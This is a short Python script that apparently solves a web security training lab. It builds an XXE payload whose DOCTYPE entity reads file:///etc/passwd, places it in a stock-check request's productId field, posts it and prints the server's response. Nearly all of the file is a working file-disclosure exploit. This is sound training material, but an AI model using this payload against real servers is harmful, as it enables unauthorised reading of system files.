from web_security_academy.core.logger import logger
from html import unescape
from lxml import etree


def solve_lab(session):
    path = "/product/stock"

    doctype = '<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>'
    stock_check = etree.Element("stockCheck")
    etree.SubElement(stock_check, "productId").text = "&xxe;"
    etree.SubElement(stock_check, "storeId").text = "1"

    data = etree.tostring(
        stock_check, encoding="UTF-8", xml_declaration=True, doctype=doctype
    )
    data = unescape(data.decode())

    logger.info(
        f'Injecting an XML external entity with the following POST request to "{path}":'
    )
    print(f"{data}")

    resp = session.post_path(path, data=data)
    logger.success("XXE injection successful with the following response:")
    print(f"{resp.text}")
